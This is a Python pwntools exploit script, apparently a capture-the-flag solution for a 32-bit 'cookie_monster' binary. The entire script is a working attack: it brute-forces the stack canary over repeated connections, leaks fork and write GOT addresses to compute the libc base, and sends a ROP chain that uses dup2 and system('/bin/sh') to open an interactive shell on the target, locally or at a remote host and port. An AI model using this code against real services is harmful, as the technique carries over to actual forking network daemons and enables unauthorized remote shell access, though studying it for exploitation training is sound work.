from pwn import (
    args,
    cyclic,
    gdb,
    remote,
    process,
    ROP,
    u32,
    flat,
    ELF,
    context,
    log,
    sys,
    warnings,
)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def brute_canary():
    needle = b"Come back soon!"
    canary = b"\x00"
    while len(canary) != 4:
        for i in range(256):
            r = start()
            r.sendafter(b"password!\n", cyclic(offset) + canary + bytes([i]))
            r.recvuntil(b"password:\n")
            if r.can_recv():
                if r.recvline().strip() == needle:
                    log.info(f"Found canary: {canary}")
                    canary += bytes([i])
                    break
            r.close()

    return canary


def leak_got(canary, address):
    r = start()

    payload = flat(
        {
            offset: [
                canary,
                b"A" * 12,
                elf.plt.write,
                0,
                4,
                address,
                4,
            ]
        }
    )

    r.sendlineafter(b"password!\n", payload)

    got_leak = u32(r.recv(4))

    r.close()
    return got_leak


warnings.filterwarnings("ignore")
gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./cookie_monster"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "warn"
# context.terminal = "kitty"

# libc = elf.libc
libc = ELF("./libc6-i386_2.27-3ubuntu1_amd64.so")

offset = 512

canary = u32(brute_canary())

log.warn(f"Canary: {hex(canary)}")

fork_leak = leak_got(canary, elf.got.fork)

log.warn(f"fork leak: {hex(fork_leak)}")

write_leak = leak_got(canary, elf.got.write)

log.warn(f"write leak: {hex(write_leak)}")

libc.address = write_leak - libc.sym.write
add_esp_8_ret = ROP(libc).find_gadget(["add esp, 8", "ret"])[0]

log.warn(f"Libc base: {hex(libc.address)}")

io = start()

# rop = ROP(libc)
# rop.dup2(4, 0)
# rop.dup2(4, 1)
# rop.call("system", [next(libc.search(b"/bin/sh\x00"))])

payload = flat(
    {
        offset: [
            canary,
            b"A" * 12,
            libc.sym["dup2"],
            add_esp_8_ret,  # skip args
            4,
            0,
            libc.sym["dup2"],
            add_esp_8_ret,  # skip args
            4,
            1,
            libc.sym["system"],
            libc.sym["exit"],
            next(libc.search(b"/bin/sh\x00")),
        ]
    }
)

io.sendline(payload)


io.interactive()
